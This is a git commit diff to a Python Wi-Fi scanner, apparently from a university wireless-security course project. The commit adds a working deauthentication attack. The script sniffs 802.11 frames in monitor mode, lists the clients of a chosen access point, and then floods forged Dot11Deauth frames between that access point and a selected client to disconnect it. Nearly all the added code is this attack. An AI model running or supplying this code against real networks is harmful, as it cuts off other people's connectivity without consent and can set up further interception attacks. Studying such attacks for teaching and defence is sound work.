a101b6303d791af02e5a1b23ca9369916a096812
itay-rafee <itayrafee@gmail.com>
2022-04-28 18:03:57 +0000

    Add user to choose & Attack the user

--- WiFiScanner.py
+++ WiFiScanner.py
@@ -5,6 +5,9 @@ import time
 import os
 
 import warnings
+
+from scapy.layers.dot11 import Dot11Beacon, Dot11, Dot11Elt, RadioTap, Dot11Deauth
+
 warnings.filterwarnings('ignore')
 
 # RUN EXAMPLE: sudo python3 WiFiScanner.py
@@ -12,20 +15,22 @@ warnings.filterwarnings('ignore')
 # (Should run with 'sudo')
 # Sources can be found here: https://github.com/AlmogJakov/Protection-of-wireless-and-mobile-networks/blob/fc91a2ffe9c7dc98ee32072a3bc1d8fb9bb08943/WiFiScanner.py
 
-stop_threads= False
+stop_threads = False
 # initialize the networks dataframe that will contain all access points nearby
-cols=['BSSID', 'SSID', 'dBm_Signal', 'Channel', 'Crypto']
+cols = ['BSSID', 'SSID', 'dBm_Signal', 'Channel', 'Crypto']
 networks = pandas.DataFrame(columns=cols, dtype=object)
+user = {}
 
 
 def callback(packet):
+    frame = packet[Dot11]
     if packet.haslayer(Dot11Beacon):
         # Extract the MAC address of the network (address 2 = address mac of the transmitter)
         bssid = packet[Dot11].addr2
         if not networks.loc[networks["BSSID"].str.contains(bssid, case=False)].empty:
             return
         # Get the name of the network
-        ssid = packet[Dot11Elt].info.decode() # A Generic 802.11 Element
+        ssid = packet[Dot11Elt].info.decode()  # A Generic 802.11 Element
         try:
             dbm_signal = packet.dBm_AntSignal
         except:
@@ -38,15 +43,11 @@ def callback(packet):
         crypto = stats.get("crypto")
         # Add the network to the global list
         networks.loc[len(networks.index)] = (bssid, ssid, dbm_signal, channel, crypto)
-        
-
-def print_all():
-    while True:
-        os.system("clear")
-        print(networks)
-        time.sleep(0.5)
-        if stop_threads:
-            break
+    # if the FCfield is "ToDS"
+    elif frame.FCfield & 0b1 != 0:
+        if frame.addr1 not in user:
+            user[frame.addr1] = set()
+        user[frame.addr1].add(frame.addr2)
 
 
 def change_channel():
@@ -77,34 +78,30 @@ if __name__ == "__main__":
             break
         except:
             val = input("Please Choose Again: ")
-    
+
     # 3. Enable monitor mode
     os.system(f'sudo ifconfig {interface} down')
     os.system(f'sudo iwconfig {interface} mode monitor')
     os.system(f'sudo ifconfig {interface} up')
-    
-    # 4. Start the thread that prints all the networks
-    printer = Thread(target=print_all)
-    printer.daemon = True
-    printer.start()
 
-    # 5. Start the channel changer
+    # 4. Start the channel changer
     channel_changer = Thread(target=change_channel)
     channel_changer.daemon = True
     channel_changer.start()
 
-    # 6. Start sniffing (Synchronous process)
-    sniff(prn=callback, iface=interface, timeout=60)
+    # 5. Start sniffing (Synchronous process)
+    sniff(prn=callback, iface=interface, timeout=30)
 
-    # 7. Stop printing and changing channel threads
+    # 6. Stop printing and changing channel threads
     stop_threads = True
 
-    # 8 Check if any clients found
-    if networks.iloc[: , :]["BSSID"].empty:
-            print("\nNo Networks Found! Aborting the process...")
-            sys.exit(1)
+    # 7 Check if any clients found
+    if networks.iloc[:, :]["BSSID"].empty:
+        print("\nNo Networks Found! Aborting the process...")
+        sys.exit(1)
 
-    # 9. Choose the AP to attack
+    # 8. Choose the AP to attack
+    print(networks.iloc[:, [0, 1]])
     val = input("\nPlease enter the index of the AP you want to attack: ")
     while True:
         try:
@@ -112,44 +109,42 @@ if __name__ == "__main__":
             break
         except:
             val = input("Please Choose Again Network: ")
-    print(f"\n{net}\n")
 
-    # 10. Run airodump-ng in a new process for packet capturing (save the MAC address of the clients in csv file).
-    print("\nPacket capturing:\n")
-    proc = subprocess.Popen(['airodump-ng', interface,'--bssid',net["BSSID"], '-c',str(net["Channel"]),
-    '--write','clients','--output-format', 'csv'])
-    time.sleep(20)     # <-- time of scanning
-    proc.terminate()   # <-- terminate the process
+    # 9. Print the Users
+    i = 1
+    gateway_mac = str(net[0])
+    for n in user[gateway_mac]:
+        print(str(i) + ' ' + n)
+        i += 1
 
-    # 11. Get the clients from the csv file
-    clients = pandas.read_csv("clients-01.csv")
-
-    # 12. Delete the csv file
-    os.system('rm *.csv')
-
-    # 13. Check if any clients found
-    if clients.iloc[2: , :]["BSSID"].empty:
-            print("\nNo clients Found! Aborting the process...")
-            sys.exit(1)
-
-    # 14. Print the clients
-    print("\nClient on Network:")
-    clients = clients.iloc[2: , :] # <-- The first 2 rows are not neccessary.
-    clients.reset_index(inplace=True)
-    client_lst = clients["BSSID"]
-    print(client_lst)
-
-    # 15. Choose the Client to attack
+    # 10. Choose the Client to attack
     val = input("\nPlease enter the index of the client you want to attack: ")
     while True:
         try:
-            client = client_lst[int(val)]
+            choose = int(val)
             break
         except:
-            val = input("Please Choose Again Client: ")
-    print(f"\n{client}\n")
+            val = input("Please Choose Again: ")
 
-    # 16. Disable monitor mode
+    # 11. Get the Client we choose
+    i = 1
+    target_mac = ''
+    for n in user[gateway_mac]:
+        if i == choose:
+            target_mac = n
+            break
+        i += 1
+
+    # 11. User attack
+    print('The target is: ', target_mac)
+    print('Attack!!! :)')
+    frame = RadioTap() / Dot11(addr1=gateway_mac, addr2=target_mac, addr3=target_mac) / Dot11Deauth(reason=1)
+    frame1 = RadioTap() / Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / Dot11Deauth(reason=1)
+    for i in range(10):
+        sendp(frame, iface=interface, count=10, inter=0.1)
+        sendp(frame1, iface=interface, count=10, inter=0.1)
+
+    # 12. Disable monitor mode
     os.system(f'sudo ifconfig {interface} down')
     os.system(f'sudo iwconfig {interface} mode managed')
     os.system(f'sudo ifconfig {interface} up')
